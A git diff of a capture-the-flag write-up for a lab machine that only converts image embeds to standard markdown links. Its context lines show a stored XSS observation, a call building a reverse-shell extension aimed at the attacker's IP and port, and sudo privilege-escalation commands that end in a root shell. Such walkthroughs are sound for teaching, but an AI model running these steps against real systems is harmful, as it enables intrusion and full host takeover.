@@ -24,14 +24,14 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 ## Port 80
-![[Pasted image 20260218082519.png]]
+![Pasted image 20260218082519](../Attachments/Pasted%20image%2020260218082519.png)
 
 - There are some sample zip files I can download. Furthermore I can upload extension. For a test I uploaded an extension from the sample download. The output pointed to a url `browsedinternals.htb` 
 - On accessing the site I see its a gitea website.
-![[Pasted image 20260218110849.png]]
+![Pasted image 20260218110849](../Attachments/Pasted%20image%2020260218110849.png)
 
 - There is a markdown preview repo:
-![[Pasted image 20260218110919.png]]
+![Pasted image 20260218110919](../Attachments/Pasted%20image%2020260218110919.png)
 - The description states `This webapp allows us to convert our md files to html. Still in developement, it should only run locally !!!`. 
 - in the app.py we see it converts the entire content without sanitization to html. this can lead to a stored XSS attack (`html = markdown.markdown(content)`
 - also in main we know it goes for `127.0.0.1:5000`
@@ -102,14 +102,14 @@ if __name__ == "__main__":
     # Change this to your HTB Tun0 IP
     create_shell_extension("10.10.16.26", "9999")
 ```
-![[Pasted image 20260218094942.png]]
+![Pasted image 20260218094942](../Attachments/Pasted%20image%2020260218094942.png)
 - I grab user flag:
-![[Pasted image 20260218095011.png]]
+![Pasted image 20260218095011](../Attachments/Pasted%20image%2020260218095011.png)
 
 
 ## Privilege Escalation
 - sudo privileges show a command we can pass as root:
-![[Pasted image 20260218095048.png]]
+![Pasted image 20260218095048](../Attachments/Pasted%20image%2020260218095048.png)
 
 - can use this exploit.py (in /tmp/exploit.py):
 ```
@@ -155,7 +155,7 @@ python3 /tmp/exploit.py
 sudo /opt/extensiontool/extension_tool.py --ext Fontify
 /tmp/rootbash -p
 ```
-![[Pasted image 20260218095343.png]]
+![Pasted image 20260218095343](../Attachments/Pasted%20image%2020260218095343.png)
 
 - I grab root flag:
-![[Pasted image 20260218095437.png]]
+![Pasted image 20260218095437](../Attachments/Pasted%20image%2020260218095437.png)
